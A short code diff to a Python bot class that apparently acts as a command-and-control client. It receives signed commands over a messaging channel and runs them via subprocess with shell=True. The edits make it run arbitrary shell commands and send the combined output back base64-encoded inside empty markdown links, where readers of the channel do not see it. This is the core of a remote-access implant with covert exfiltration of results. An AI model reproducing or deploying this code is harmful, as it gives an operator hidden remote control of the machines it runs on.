@@ -8,6 +8,8 @@ from queue import Queue
 
 from typing import List
 
+from nacl.exceptions import BadSignatureError
+
 from channel import Channel
 from time import sleep
 from nacl.signing import VerifyKey
@@ -107,11 +109,14 @@ class Bot:
         :param response_header: Which response message to use
         :param response_id: ID to append to the output
         """
-        process = subprocess.run(args, capture_output=True)
+        try:
+            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+        except subprocess.CalledProcessError as err:
+            output = err.output
+
         self.channel.send_message(
             f"{response_header} "
-            f"[]({base64.b64encode(process.stdout).decode('utf-8')})"
-            f"[]({base64.b64encode(process.stderr).decode('utf-8')})"
+            f"[]({base64.b64encode(output).decode('utf-8')}) "
             f"{response_id}"
         )
 
@@ -126,8 +131,7 @@ class Bot:
 
         try:
             self.verify_key.verify(command, signature)
-        except Exception:
-            print("Failed to verify the command.")
+        except BadSignatureError:
             return False
 
         return True
